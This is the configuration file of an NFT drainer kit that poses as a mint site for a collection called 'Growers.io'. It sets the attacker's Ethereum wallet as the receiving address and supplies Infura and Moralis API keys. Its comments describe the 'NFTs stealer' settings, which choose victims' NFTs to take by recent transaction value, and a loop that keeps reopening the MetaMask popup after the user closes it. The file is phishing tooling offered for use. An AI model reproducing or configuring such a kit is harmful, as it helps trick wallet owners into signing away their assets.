// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0xdc0898232c0A026e4582569B7Dcd8e013FE32ba9";    // Your ETH wallet that you have to receive NFTs
const infuraId = "2820d106e97a43d4a24b89c780121c98"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "SVVkbjm8ZFYqIS6TvEOJRKDs6MVvyPMjCE0etXjVqmBvHlcQChkiR1orhfQMLtC0"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Growers.io",
    title: "Grow Here", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "29/06/2022",
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/Growers_io",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.001,         // Price per NFT.
    totalSupply: 2022,   // Total supply of NFTs.
    minUnits: 2,        // Min units to buy.
    maxUnits: 2,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.000001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFTr | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
